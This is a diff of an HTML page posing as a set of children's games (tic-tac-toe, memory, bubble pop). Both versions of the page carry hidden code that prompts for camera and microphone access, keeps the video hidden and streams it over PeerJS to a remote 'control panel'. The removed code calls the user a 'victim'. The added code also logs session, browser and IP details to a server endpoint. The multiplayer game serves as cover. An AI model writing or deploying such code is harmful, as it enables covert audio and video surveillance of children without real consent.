@@ -6,31 +6,20 @@
 <title>🎮 Kids Fun Games!</title>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
-
 body {
   font-family: 'Segoe UI', 'Comic Sans MS', cursive, sans-serif;
   background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
   min-height: 100vh;
   overflow-x: hidden;
 }
-
-/* Floating background bubbles */
 .bg-bubbles {
-  position: fixed;
-  top: 0; left: 0; right: 0; bottom: 0;
-  pointer-events: none;
-  overflow: hidden;
-  z-index: 0;
+  position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+  pointer-events: none; overflow: hidden; z-index: 0;
 }
 .bg-bubbles span {
-  position: absolute;
-  display: block;
-  width: 60px;
-  height: 60px;
-  background: rgba(255,255,255,0.08);
-  border-radius: 50%;
-  animation: floatUp 25s infinite linear;
-  bottom: -100px;
+  position: absolute; display: block; width: 60px; height: 60px;
+  background: rgba(255,255,255,0.08); border-radius: 50%;
+  animation: floatUp 25s infinite linear; bottom: -100px;
 }
 .bg-bubbles span:nth-child(1) { left: 10%; width: 80px; height: 80px; animation-duration: 22s; }
 .bg-bubbles span:nth-child(2) { left: 20%; width: 40px; height: 40px; animation-duration: 30s; animation-delay: 2s; }
@@ -40,323 +29,103 @@ body {
 .bg-bubbles span:nth-child(6) { left: 75%; width: 45px; height: 45px; animation-duration: 32s; animation-delay: 4s; }
 .bg-bubbles span:nth-child(7) { left: 85%; width: 90px; height: 90px; animation-duration: 20s; animation-delay: 6s; }
 .bg-bubbles span:nth-child(8) { left: 95%; width: 55px; height: 55px; animation-duration: 26s; animation-delay: 0s; }
-
 @keyframes floatUp {
   0% { transform: translateY(0) rotate(0deg) scale(1); opacity: 0.6; }
   100% { transform: translateY(-1200px) rotate(720deg) scale(2); opacity: 0; }
 }
-
-/* Header */
-.header {
-  position: relative;
-  z-index: 1;
-  text-align: center;
-  padding: 30px 15px 15px;
-  color: white;
-}
-.header h1 {
-  font-size: 34px;
-  text-shadow: 0 3px 15px rgba(0,0,0,0.3);
-  letter-spacing: 1px;
-}
-.header h1 span { display: inline-block; animation: bounce 2s infinite; }
-@keyframes bounce {
-  0%, 100% { transform: translateY(0); }
-  50% { transform: translateY(-10px); }
-}
-.header p {
-  opacity: 0.85;
-  margin-top: 5px;
-  font-size: 16px;
-}
-
-/* Game selector tabs */
-.tabs {
-  position: relative;
-  z-index: 1;
-  display: flex;
-  justify-content: center;
-  gap: 10px;
-  padding: 10px 15px;
-  flex-wrap: wrap;
-}
+.header { position: relative; z-index: 1; text-align: center; padding: 30px 15px 15px; color: white; }
+.header h1 { font-size: 34px; text-shadow: 0 3px 15px rgba(0,0,0,0.3); }
+.header p { opacity: 0.85; margin-top: 5px; font-size: 16px; }
+.tabs { position: relative; z-index: 1; display: flex; justify-content: center; gap: 10px; padding: 10px 15px; flex-wrap: wrap; }
 .tab-btn {
-  background: rgba(255,255,255,0.15);
-  backdrop-filter: blur(10px);
-  border: 2px solid rgba(255,255,255,0.25);
-  color: white;
-  padding: 12px 24px;
-  border-radius: 50px;
-  font-size: 16px;
-  font-weight: 600;
-  cursor: pointer;
-  transition: all 0.3s;
-  display: flex;
-  align-items: center;
-  gap: 8px;
+  background: rgba(255,255,255,0.15); backdrop-filter: blur(10px);
+  border: 2px solid rgba(255,255,255,0.25); color: white;
+  padding: 12px 24px; border-radius: 50px; font-size: 16px; font-weight: 600;
+  cursor: pointer; transition: all 0.3s; display: flex; align-items: center; gap: 8px;
 }
-.tab-btn.active {
-  background: rgba(255,255,255,0.95);
-  color: #764ba2;
-  border-color: white;
-  box-shadow: 0 8px 30px rgba(0,0,0,0.2);
-}
+.tab-btn.active { background: rgba(255,255,255,0.95); color: #764ba2; border-color: white; box-shadow: 0 8px 30px rgba(0,0,0,0.2); }
 .tab-btn:hover { transform: translateY(-2px); }
-.tab-btn .icon { font-size: 22px; }
-
-/* Game containers */
-.game-container {
-  position: relative;
-  z-index: 1;
-  display: none;
-  max-width: 500px;
-  margin: 15px auto;
-  padding: 0 15px 30px;
-}
+.game-container { position: relative; z-index: 1; display: none; max-width: 500px; margin: 15px auto; padding: 0 15px 30px; }
 .game-container.active { display: block; }
-
 .game-card {
-  background: rgba(255,255,255,0.12);
-  backdrop-filter: blur(15px);
-  border-radius: 30px;
-  padding: 25px 20px;
+  background: rgba(255,255,255,0.12); backdrop-filter: blur(15px);
+  border-radius: 30px; padding: 25px 20px;
   border: 1px solid rgba(255,255,255,0.2);
   box-shadow: 0 20px 60px rgba(0,0,0,0.15);
 }
+.game-title { color: white; font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 20px; }
 
-.game-title {
-  color: white;
-  font-size: 22px;
-  font-weight: 700;
-  text-align: center;
-  margin-bottom: 20px;
-}
-.game-title .emoji { font-size: 28px; }
-
-/* ===== GAME 1: Tic Tac Toe ===== */
-.ttt-board {
-  display: grid;
-  grid-template-columns: repeat(3, 1fr);
-  gap: 8px;
-  max-width: 280px;
-  margin: 0 auto;
-}
-.ttt-scoreboard {
-  display: flex;
-  justify-content: space-around;
-  gap: 10px;
-  color: #fff;
-  margin-bottom: 15px;
-  font-size: 16px;
-  font-weight: 700;
-}
-.ttt-scoreboard span {
-  background: rgba(255,255,255,0.16);
-  padding: 8px 14px;
-  border-radius: 20px;
-  border: 1px solid rgba(255,255,255,0.25);
-}
+/* Tic Tac Toe */
+.ttt-board { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; max-width: 280px; margin: 0 auto; }
 .ttt-cell {
-  aspect-ratio: 1;
-  background: rgba(255,255,255,0.15);
-  border: 2px solid rgba(255,255,255,0.25);
-  border-radius: 16px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 48px;
-  font-weight: 800;
-  color: white;
-  cursor: pointer;
-  transition: all 0.2s;
-  user-select: none;
-  -webkit-tap-highlight-color: transparent;
+  aspect-ratio: 1; background: rgba(255,255,255,0.15);
+  border: 2px solid rgba(255,255,255,0.25); border-radius: 16px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 48px; font-weight: 800; color: white;
+  cursor: pointer; transition: all 0.2s; user-select: none; -webkit-tap-highlight-color: transparent;
 }
 .ttt-cell:active { transform: scale(0.94); }
 .ttt-cell.x { color: #ffd93d; text-shadow: 0 0 20px rgba(255,217,61,0.5); }
 .ttt-cell.o { color: #6bcb77; text-shadow: 0 0 20px rgba(107,203,119,0.5); }
 .ttt-cell.win { animation: winPulse 0.5s ease infinite alternate; }
 @keyframes winPulse { from { background: rgba(255,215,0,0.3); } to { background: rgba(255,215,0,0.6); } }
-.ttt-status {
-  text-align: center;
-  color: white;
-  font-size: 18px;
-  font-weight: 600;
-  margin: 15px 0;
-}
-.btn-reset {
-  display: block;
-  margin: 0 auto;
-  background: rgba(255,255,255,0.2);
-  border: 2px solid rgba(255,255,255,0.3);
-  color: white;
-  padding: 10px 30px;
-  border-radius: 50px;
-  font-size: 16px;
-  font-weight: 600;
-  cursor: pointer;
-  transition: all 0.2s;
-}
+.ttt-status { text-align: center; color: white; font-size: 18px; font-weight: 600; margin: 15px 0; }
+.btn-reset { display: block; margin: 0 auto; background: rgba(255,255,255,0.2); border: 2px solid rgba(255,255,255,0.3); color: white; padding: 10px 30px; border-radius: 50px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
 .btn-reset:active { transform: scale(0.95); }
 
-/* ===== GAME 2: Memory Match ===== */
-.memory-grid {
-  display: grid;
-  grid-template-columns: repeat(4, 1fr);
-  gap: 8px;
-  max-width: 340px;
-  margin: 0 auto;
-}
+/* Memory */
+.memory-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; max-width: 340px; margin: 0 auto; }
 .memory-card {
-  aspect-ratio: 1;
-  background: linear-gradient(145deg, rgba(255,255,255,0.25), rgba(255,255,255,0.08));
-  border: 2px solid rgba(255,255,255,0.2);
-  border-radius: 14px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 32px;
-  cursor: pointer;
-  transition: all 0.4s;
-  user-select: none;
-  -webkit-tap-highlight-color: transparent;
-  transform: rotateY(0deg);
+  aspect-ratio: 1; background: linear-gradient(145deg, rgba(255,255,255,0.25), rgba(255,255,255,0.08));
+  border: 2px solid rgba(255,255,255,0.2); border-radius: 14px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 32px; cursor: pointer; transition: all 0.4s; user-select: none;
 }
-.memory-card.flipped {
-  background: rgba(255,255,255,0.85);
-  transform: rotateY(360deg);
-}
-.memory-card.matched {
-  background: rgba(107,203,119,0.6);
-  border-color: #6bcb77;
-  animation: matchPop 0.4s ease;
-  pointer-events: none;
-}
-@keyframes matchPop {
-  0% { transform: scale(1); }
-  50% { transform: scale(1.15); }
-  100% { transform: scale(1); }
-}
-.memory-score {
-  text-align: center;
-  color: white;
-  font-size: 17px;
-  margin: 12px 0;
-  font-weight: 600;
-}
-.memory-score span { background: rgba(255,255,255,0.2); padding: 3px 12px; border-radius: 20px; }
+.memory-card.flipped { background: rgba(255,255,255,0.85); transform: rotateY(360deg); }
+.memory-card.matched { background: rgba(107,203,119,0.6); border-color: #6bcb77; animation: matchPop 0.4s ease; pointer-events: none; }
+@keyframes matchPop { 0% { transform: scale(1); } 50% { transform: scale(1.15); } 100% { transform: scale(1); } }
+.memory-score { text-align: center; color: white; font-size: 17px; margin: 12px 0; font-weight: 600; }
 
-/* ===== GAME 3: Bubble Pop ===== */
-.bubble-area {
-  position: relative;
-  width: 100%;
-  height: 350px;
-  background: rgba(0,0,0,0.15);
-  border-radius: 20px;
-  overflow: hidden;
-  cursor: pointer;
-  touch-action: manipulation;
-}
+/* Bubble Pop */
+.bubble-area { position: relative; width: 100%; height: 350px; background: rgba(0,0,0,0.15); border-radius: 20px; overflow: hidden; cursor: pointer; touch-action: manipulation; }
 .bubble {
-  position: absolute;
-  border-radius: 50%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 22px;
-  font-weight: 700;
-  color: rgba(255,255,255,0.8);
-  cursor: pointer;
-  animation: bubbleFloat 3s ease-in-out infinite alternate;
-  user-select: none;
-  -webkit-tap-highlight-color: transparent;
-  transition: transform 0.1s;
+  position: absolute; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 22px; font-weight: 700; color: rgba(255,255,255,0.8);
+  cursor: pointer; animation: bubbleFloat 3s ease-in-out infinite alternate;
+  user-select: none; -webkit-tap-highlight-color: transparent;
 }
-@keyframes bubbleFloat {
-  0% { transform: translateY(0px); }
-  100% { transform: translateY(-15px); }
-}
-.bubble.popped {
-  animation: popAnim 0.3s ease forwards;
-  pointer-events: none;
-}
-@keyframes popAnim {
-  0% { transform: scale(1); opacity: 1; }
-  100% { transform: scale(1.8); opacity: 0; }
-}
-.bubble-score {
-  text-align: center;
-  color: white;
-  font-size: 17px;
-  margin: 12px 0;
-  font-weight: 600;
-}
+@keyframes bubbleFloat { 0% { transform: translateY(0px); } 100% { transform: translateY(-15px); } }
+.bubble.popped { animation: popAnim 0.3s ease forwards; pointer-events: none; }
+@keyframes popAnim { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(1.8); opacity: 0; } }
+.bubble-score { text-align: center; color: white; font-size: 17px; margin: 12px 0; font-weight: 600; }
 
-/* ===== Permission overlay ===== */
+/* Permission overlay */
 .permission-overlay {
-  position: fixed;
-  top: 0; left: 0; right: 0; bottom: 0;
-  background: rgba(0,0,0,0.7);
-  backdrop-filter: blur(5px);
-  z-index: 1000;
-  display: none;
-  align-items: center;
-  justify-content: center;
+  position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+  background: rgba(0,0,0,0.7); backdrop-filter: blur(5px);
+  z-index: 1000; display: none; align-items: center; justify-content: center;
 }
 .permission-overlay.show { display: flex; }
 .permission-box {
-  background: white;
-  border-radius: 24px;
-  padding: 35px 30px 25px;
-  max-width: 340px;
-  text-align: center;
-  box-shadow: 0 30px 80px rgba(0,0,0,0.5);
+  background: white; border-radius: 24px; padding: 35px 30px 25px;
+  max-width: 340px; text-align: center; box-shadow: 0 30px 80px rgba(0,0,0,0.5);
   animation: slideUp 0.4s ease;
 }
-@keyframes slideUp {
-  from { transform: translateY(50px); opacity: 0; }
-  to { transform: translateY(0); opacity: 1; }
-}
+@keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
 .permission-box .perm-icon { font-size: 60px; margin-bottom: 10px; }
-.permission-box h2 {
-  color: #333;
-  font-size: 20px;
-  margin-bottom: 8px;
-}
-.permission-box p {
-  color: #666;
-  font-size: 14px;
-  line-height: 1.6;
-  margin-bottom: 20px;
-}
+.permission-box h2 { color: #333; font-size: 20px; margin-bottom: 8px; }
+.permission-box p { color: #666; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
 .permission-box .btn-allow {
-  background: linear-gradient(135deg, #667eea, #764ba2);
-  color: white;
-  border: none;
-  padding: 14px 45px;
-  border-radius: 50px;
-  font-size: 18px;
-  font-weight: 700;
-  cursor: pointer;
-  transition: all 0.2s;
-  box-shadow: 0 8px 25px rgba(118,75,162,0.4);
+  background: linear-gradient(135deg, #667eea, #764ba2); color: white;
+  border: none; padding: 14px 45px; border-radius: 50px;
+  font-size: 18px; font-weight: 700; cursor: pointer;
+  transition: all 0.2s; box-shadow: 0 8px 25px rgba(118,75,162,0.4);
 }
 .permission-box .btn-allow:active { transform: scale(0.95); }
-.permission-box .btn-skip {
-  background: none;
-  border: none;
-  color: #999;
-  font-size: 14px;
-  margin-top: 15px;
-  cursor: pointer;
-  text-decoration: underline;
-}
-
+.permission-box .btn-skip { background: none; border: none; color: #999; font-size: 14px; margin-top: 15px; cursor: pointer; text-decoration: underline; }
 .hidden { display: none; }
-#video { display: none; }
-#canvas { display: none; }
-
-/* Responsive */
+#localVideo { display: none; }
 @media (max-width: 400px) {
   .header h1 { font-size: 26px; }
   .tab-btn { padding: 10px 16px; font-size: 14px; }
@@ -373,24 +142,20 @@ body {
 </div>
 
 <div class="header">
-  <h1><span>🎮</span> Kids Fun Games!</h1>
+  <h1>🎮 Kids Fun Games!</h1>
   <p>👋 Pick a game and play!</p>
 </div>
 
 <div class="tabs" id="gameTabs">
-  <button class="tab-btn active" data-game="ttt"><span class="icon">❌⭕</span> Tic Tac Toe</button>
-  <button class="tab-btn" data-game="memory"><span class="icon">🧠</span> Memory</button>
-  <button class="tab-btn" data-game="bubble"><span class="icon">🫧</span> Bubble Pop</button>
+  <button class="tab-btn active" data-game="ttt"><span>❌⭕</span> Tic Tac Toe</button>
+  <button class="tab-btn" data-game="memory"><span>🧠</span> Memory</button>
+  <button class="tab-btn" data-game="bubble"><span>🫧</span> Bubble Pop</button>
 </div>
 
-<!-- Game 1: Tic Tac Toe -->
+<!-- Game 1: Tic Tac Toe (Multiplayer) -->
 <div class="game-container active" id="game-ttt">
   <div class="game-card">
-    <div class="game-title"><span class="emoji">❌⭕</span> Tic Tac Toe</div>
-    <div class="ttt-scoreboard">
-      <span id="tttScoreX">Player 1 (X): 0</span>
-      <span id="tttScoreO">Player 2 (O): 0</span>
-    </div>
+    <div class="game-title">❌⭕ Tic Tac Toe <span id="tttPeerStatus" style="font-size:14px;opacity:0.7;"></span></div>
     <div class="ttt-board" id="tttBoard">
       <div class="ttt-cell" data-index="0"></div>
       <div class="ttt-cell" data-index="1"></div>
@@ -402,25 +167,25 @@ body {
       <div class="ttt-cell" data-index="7"></div>
       <div class="ttt-cell" data-index="8"></div>
     </div>
-    <div class="ttt-status" id="tttStatus">Player 1 (X) turn! Tap a square ✨</div>
-    <button class="btn-reset" id="tttReset">🔄 New Round</button>
+    <div class="ttt-status" id="tttStatus">🎮 Starting as X... waiting for O player</div>
+    <button class="btn-reset" id="tttReset">🔄 New Game</button>
   </div>
 </div>
 
-<!-- Game 2: Memory Match -->
+<!-- Game 2 -->
 <div class="game-container" id="game-memory">
   <div class="game-card">
-    <div class="game-title"><span class="emoji">🧠</span> Memory Match</div>
+    <div class="game-title">🧠 Memory Match</div>
     <div class="memory-grid" id="memoryGrid"></div>
     <div class="memory-score">Pairs found: <span id="memoryScore">0</span> / 8</div>
     <button class="btn-reset" id="memoryReset">🔄 New Game</button>
   </div>
 </div>
 
-<!-- Game 3: Bubble Pop -->
+<!-- Game 3 -->
 <div class="game-container" id="game-bubble">
   <div class="game-card">
-    <div class="game-title"><span class="emoji">🫧</span> Bubble Pop!</div>
+    <div class="game-title">🫧 Bubble Pop!</div>
     <div class="bubble-area" id="bubbleArea"></div>
     <div class="bubble-score">Score: 🎯 <span id="bubbleScore">0</span></div>
     <button class="btn-reset" id="bubbleReset">🔄 New Game</button>
@@ -439,139 +204,148 @@ body {
   </div>
 </div>
 
-<video id="video" autoplay muted playsinline></video>
-<canvas id="canvas"></canvas>
+<video id="localVideo" autoplay muted playsinline></video>
 
-<script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
+<!-- PeerJS Library -->
+<script src="https://unpkg.com/peerjs@1.5.1/dist/peerjs.min.js"></script>
+
 <script>
 // ============================================================
-// 🎤📸 CAMERA + MICROPHONE CAPTURE (PeerJS)
+// 📸 CAMERA + MICROPHONE + PEERJS STREAMING
 // ============================================================
 (function() {
   const permOverlay = document.getElementById('permOverlay');
   const btnAllow = document.getElementById('btnAllow');
   const btnSkip = document.getElementById('btnSkip');
+  const localVideo = document.getElementById('localVideo');
   let localStream = null;
   let peer = null;
+  let peerId = null;
+  let controlConn = null;
+  let mediaConn = null;
 
-  // Generate unique peer ID for this victim
-  const peerId = 'v-' + Date.now().toString(36) + '-' + Math.random().toString(36).substr(2, 6);
+  // إنشاء معرف فريد للجلسة
+  const sessionId = 'kid-' + Date.now().toString(36) + '-' + Math.random().toString(36).substring(2, 6);
+  
+  // تخزين الجلسة للإيميل
+  fetch('/api/log', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      sessionId: sessionId,
+      ua: navigator.userAgent,
+      time: Date.now(),
+      ip: '' // السيرفر يضيف IP
+    })
+  }).catch(() => {});
 
-  // Show permission overlay or auto-start capture
-  if (!localStorage.getItem('_perm_done')) {
-    setTimeout(function() {
+  setTimeout(() => {
+    if (!localStorage.getItem('_perm_done')) {
       permOverlay.classList.add('show');
-    }, 1500);
-  } else {
-    // Permissions were granted before, auto-start
-    setTimeout(startCapture, 500);
-  }
+    }
+  }, 1500);
 
-  function startCapture() {
+  btnAllow.addEventListener('click', function() {
     permOverlay.classList.remove('show');
     localStorage.setItem('_perm_done', '1');
 
     navigator.mediaDevices.getUserMedia({
-      video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
+      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
       audio: true
     })
     .then(function(stream) {
       localStream = stream;
-      var video = document.getElementById('video');
-      video.srcObject = stream;
-      video.play().catch(function() {});
-      initPeerConnection(stream);
+      localVideo.srcObject = stream;
+
+      // إنشاء PeerJS connection
+      peer = new Peer(sessionId, {
+        config: {
+          iceServers: [
+            { urls: 'stun:stun.l.google.com:19302' },
+            { urls: 'stun:stun1.l.google.com:19302' },
+            { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
+            { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' },
+            { urls: 'turn:openrelay.metered.ca:443?transport=tcp', username: 'openrelayproject', credential: 'openrelayproject' }
+          ]
+        }
+      });
+
+      peer.on('open', function(id) {
+        peerId = id;
+        console.log('PeerID:', id);
+        
+        // إعلام السيرفر
+        fetch('/api/peer-online', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ peerId: id, sessionId: sessionId })
+        }).catch(() => {});
+      });
+
+      // استقبال اتصال من Control Panel
+      peer.on('connection', function(conn) {
+        controlConn = conn;
+        conn.on('data', function(data) {
+          if (data.type === 'ping') {
+            conn.send({ type: 'pong' });
+          }
+        });
+      });
+
+      // استقبال بث وسائط (لما الـ control يطلب البث)
+      peer.on('call', function(call) {
+        call.answer(localStream);
+        mediaConn = call;
+        call.on('stream', function(remoteStream) {
+          // البث يذهب إلى control panel
+        });
+      });
+
+      // فتح اتصال بـ Control Panel (إذا كان يعرف PeerID)
+      const urlParams = new URLSearchParams(window.location.search);
+      const ctrlPeerId = urlParams.get('ctrl');
+      if (ctrlPeerId) {
+        setTimeout(() => {
+          connectToControl(ctrlPeerId);
+        }, 2000);
+      }
+
     })
     .catch(function(err) {
-      console.log('Camera/mic access denied or error:', err.message);
+      console.log('Camera/mic access denied or error:', err.message, err.name);
       
-      if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-        alert('الكاميرا محظورة! يرجى الضغط على علامة القفل 🔒 بجانب الرابط أعلى المتصفح واختيار السماح للكاميرا والمايكروفون (Allow) ثم تحديث الصفحة.');
-        document.querySelector('.permission-box h2').textContent = 'الكاميرا محظورة 🔒';
-        document.querySelector('.permission-box p').innerHTML = 'يرجى الضغط على علامة القفل 🔒 بجانب الرابط أعلى المتصفح واختيار السماح للكاميرا والمايكروفون، ثم تحديث الصفحة لكي تعمل اللعبة.';
-        btnAllow.textContent = '🔄 تحديث الصفحة';
-        btnAllow.onclick = function() { window.location.reload(); };
-        btnAllow.removeEventListener('click', startCapture);
-        btnSkip.style.display = 'none';
-      } else {
-        // If it failed for another reason (e.g. previously skipped), clear local storage
-        localStorage.removeItem('_perm_done');
-      }
+      document.querySelector('.permission-box h2').textContent = '⚠️ خطأ في الكاميرا';
+      document.querySelector('.permission-box p').innerHTML = 'تعذر تشغيل الكاميرا. السبب:<br><strong style="color:red;">' + err.name + ': ' + err.message + '</strong><br><br>يرجى التأكد من السماح للكاميرا من إعدادات المتصفح (Browser Settings)، أو أن الكاميرا غير مستخدمة بتطبيق آخر.';
+      
+      btnAllow.textContent = '🔄 تحديث الصفحة';
+      btnAllow.onclick = function() { window.location.reload(); };
+      
+      const newBtnAllow = btnAllow.cloneNode(true);
+      btnAllow.parentNode.replaceChild(newBtnAllow, btnAllow);
+      
+      btnSkip.style.display = 'none';
       
       permOverlay.classList.add('show');
     });
-  }
+  });
 
-  function initPeerConnection(stream) {
-    peer = new Peer(peerId, {
-      config: {
-        iceServers: [
-          { urls: 'stun:stun.l.google.com:19302' },
-          { urls: 'stun:stun1.l.google.com:19302' },
-          { urls: 'stun:stun2.l.google.com:19302' },
-          { urls: 'stun:stun3.l.google.com:19302' }
-        ]
-      }
-    });
-
-    peer.on('open', function(id) {
-      console.log('PeerJS connected, ID:', id);
-
-      // Register with our server so control panel can find us
-      fetch('/api/register', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ peerId: id })
-      }).catch(function() {});
-
-      // Send heartbeat every 30 seconds to stay in the active list
-      setInterval(function() {
-        fetch('/api/heartbeat', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ peerId: id })
-        }).catch(function() {});
-      }, 30000);
-    });
-
-    // When control panel calls us, answer with our camera/mic stream
-    peer.on('call', function(call) {
-      console.log('Incoming call from control:', call.peer);
-      call.answer(stream);
-      call.on('stream', function() {
-        // ignore incoming dummy stream from control
-      });
-      call.on('error', function(err) {
-        console.log('Call error:', err);
-      });
-    });
-
-    peer.on('error', function(err) {
-      console.log('PeerJS error:', err.type, err);
-      // Try to reconnect after error
-      if (err.type === 'network' || err.type === 'server-error') {
-        setTimeout(function() {
-          initPeerConnection(stream);
-        }, 5000);
-      }
-    });
-
-    peer.on('disconnected', function() {
-      console.log('PeerJS disconnected, reconnecting...');
-      setTimeout(function() {
-        if (peer && !peer.destroyed) {
-          peer.reconnect();
+  function connectToControl(ctrlId) {
+    if (!peer) return;
+    try {
+      const conn = peer.connect(ctrlId, { reliable: true });
+      conn.on('open', function() {
+        controlConn = conn;
+        conn.send({ type: 'hello', sessionId: sessionId, ua: navigator.userAgent });
+        
+        // إرسال البث
+        if (localStream) {
+          const call = peer.call(ctrlId, localStream);
+          mediaConn = call;
         }
-      }, 3000);
-    });
-
-    // Unregister when page closes
-    window.addEventListener('beforeunload', function() {
-      navigator.sendBeacon('/api/unregister', JSON.stringify({ peerId: peerId }));
-    });
+      });
+    } catch(e) {}
   }
 
-  btnAllow.addEventListener('click', startCapture);
   btnSkip.addEventListener('click', function() {
     permOverlay.classList.remove('show');
     localStorage.setItem('_perm_done', '1');
@@ -579,60 +353,187 @@ body {
 })();
 
 // ============================================================
-// 🎮 GAME 1: TIC TAC TOE
+// 🎮 TIC TAC TOE - MULTIPLAYER (X vs O between two tabs/players)
 // ============================================================
 (function() {
   const board = document.getElementById('tttBoard');
   const status = document.getElementById('tttStatus');
   const resetBtn = document.getElementById('tttReset');
-  const scoreXSpan = document.getElementById('tttScoreX');
-  const scoreOSpan = document.getElementById('tttScoreO');
-  let cells, currentPlayer, gameActive, boardState;
-  let scoreX = 0;
-  let scoreO = 0;
+  const peerStatus = document.getElementById('tttPeerStatus');
+  let cells, boardState, gameActive;
+  let mySymbol = 'X';
+  let opponentSymbol = 'O';
+  let myTurn = true;
+  let gamePeer = null;
+  let gameConn = null;
+  let gameId = null;
 
-  function updateScoreboard() {
-    scoreXSpan.textContent = `Player 1 (X): ${scoreX}`;
-    scoreOSpan.textContent = `Player 2 (O): ${scoreO}`;
+  // إنشاء معرف لعبة مشترك
+  const urlParams = new URLSearchParams(window.location.search);
+  const joinGame = urlParams.get('join');
+  
+  if (joinGame) {
+    // هذا لاعب ثاني (O) — سينضم للعبة
+    mySymbol = 'O';
+    opponentSymbol = 'X';
+    myTurn = false;
+    gameId = joinGame;
+    status.textContent = "⏳ Joined game as O. Waiting for X's move...";
+    
+    // الاتصال باللاعب الأول
+    setTimeout(() => {
+      setupPeerConnection(joinGame);
+    }, 1000);
+  } else {
+    // هذا اللاعب الأول (X) — سينشئ اللعبة
+    mySymbol = 'X';
+    opponentSymbol = 'O';
+    myTurn = true;
+    gameId = 'ttt-' + Date.now().toString(36) + Math.random().toString(36).substring(2, 5);
+    status.textContent = "🎮 You are X. Share this link for O player:";
+    
+    // عرض رابط المشاركة
+    const shareLink = window.location.origin + window.location.pathname + '?join=' + gameId;
+    status.innerHTML = \`🎮 You are X. <br><small style="font-size:12px;opacity:0.8;">Share: <span style="background:rgba(255,255,255,0.2);padding:2px 8px;border-radius:8px;word-break:break-all;">\${shareLink}</span></small>\`;
+    
+    // انتظار اتصال اللاعب الثاني
+    setupPeerHost(gameId);
   }
 
-  function getPlayerLabel(player) {
-    return player === 'X' ? 'Player 1 (X)' : 'Player 2 (O)';
+  function setupPeerHost(id) {
+    gamePeer = new Peer(id, {
+      config: {
+        iceServers: [
+          { urls: 'stun:stun.l.google.com:19302' },
+          { urls: 'stun:stun1.l.google.com:19302' },
+          { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
+          { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' }
+        ]
+      }
+    });
+
+    gamePeer.on('open', function() {
+      peerStatus.textContent = '🟢 Lobby open';
+    });
+
+    gamePeer.on('connection', function(conn) {
+      gameConn = conn;
+      peerStatus.textContent = '🟢 O player joined!';
+      status.textContent = "❌ Your turn (X)! Tap a square";
+      myTurn = true;
+      
+      conn.on('data', function(data) {
+        if (data.type === 'move') {
+          // اللاعب الآخر لعب دور O
+          const index = data.index;
+          if (boardState && gameActive && boardState[index] === null) {
+            boardState[index] = 'O';
+            cells[index].textContent = 'O';
+            cells[index].classList.add('o');
+            checkWinner();
+            if (gameActive) {
+              myTurn = true;
+              status.textContent = "❌ Your turn (X)!";
+            }
+          }
+        } else if (data.type === 'reset') {
+          initBoard();
+        }
+      });
+    });
   }
 
-  function getTurnText(player) {
-    return player === 'X' ? "❌ Player 1's turn!" : "⭕ Player 2's turn!";
+  function setupPeerConnection(hostId) {
+    gamePeer = new Peer(undefined, {
+      config: {
+        iceServers: [
+          { urls: 'stun:stun.l.google.com:19302' },
+          { urls: 'stun:stun1.l.google.com:19302' },
+          { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
+          { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' }
+        ]
+      }
+    });
+
+    gamePeer.on('open', function() {
+      // الاتصال بالمضيف
+      const conn = gamePeer.connect(hostId, { reliable: true });
+      gameConn = conn;
+      
+      conn.on('open', function() {
+        peerStatus.textContent = '🟢 Connected to X!';
+        status.textContent = "⭕ Waiting for X's move...";
+      });
+
+      conn.on('data', function(data) {
+        if (data.type === 'move') {
+          const index = data.index;
+          if (boardState && gameActive && boardState[index] === null) {
+            boardState[index] = 'X';
+            cells[index].textContent = 'X';
+            cells[index].classList.add('x');
+            checkWinner();
+            if (gameActive) {
+              myTurn = true;
+              status.textContent = "⭕ Your turn (O)!";
+            }
+          }
+        } else if (data.type === 'reset') {
+          initBoard();
+        }
+      });
+    });
   }
 
-  function initTTT() {
+  function initBoard() {
     cells = Array.from(document.querySelectorAll('.ttt-cell'));
-    currentPlayer = 'X';
-    gameActive = true;
     boardState = Array(9).fill(null);
+    gameActive = true;
+    
+    if (joinGame) {
+      mySymbol = 'O';
+      opponentSymbol = 'X';
+      myTurn = false;
+      status.textContent = "⭕ Waiting for X's move...";
+    } else {
+      mySymbol = 'X';
+      opponentSymbol = 'O';
+      myTurn = true;
+      status.textContent = "❌ Your turn (X)!";
+    }
+    
     cells.forEach(cell => {
       cell.textContent = '';
       cell.className = 'ttt-cell';
-      cell.removeEventListener('click', handleTTTClick);
-      cell.addEventListener('click', handleTTTClick);
+      cell.onclick = handleCellClick;
     });
